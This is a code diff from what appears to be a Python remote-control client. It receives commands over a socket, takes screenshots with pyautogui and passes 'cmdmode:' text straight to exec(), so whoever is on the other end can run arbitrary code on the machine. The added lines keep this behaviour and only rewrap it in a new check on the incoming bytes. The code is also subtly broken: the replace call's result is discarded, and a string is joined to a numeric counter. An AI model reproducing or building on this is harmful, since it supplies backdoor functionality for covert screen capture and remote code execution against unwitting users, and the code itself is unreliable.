@@ -18,19 +18,21 @@ try:
         if not data:
             break
         
-        print(data)
-        dec = data.decode()
-        print(dec)
-        if dec == "1":
-            client.send(ClientUI.Connect().encode())
-        elif dec == "2" and not th.is_alive():
-            th.start()
-        elif dec == "3":
-            pyautogui.screenshot().save("Screenshot"+screeniecounter + ".png")
-            screeniecounter = screeniecounter + 1
-        elif "cmdmode:" in  dec:
-            str.replace('cmdmode:', '')
-            exec(dec)
+        if str(data)[0] == "b":
+            dec = data.decode()
+            print(dec)
+            if dec == "1":
+                client.send(ClientUI.Connect().encode())
+            elif dec == "2" and not th.is_alive():
+                th.start()
+            elif dec == "3":
+                pyautogui.screenshot().save("Screenshot"+screeniecounter + ".png")
+                screeniecounter = screeniecounter + 1
+            elif "cmdmode:" in  dec:
+                str.replace('cmdmode:', '')
+                exec(dec)
+        else:
+            print(data)
     print("Update Window")
 except OSError as e:
     pass
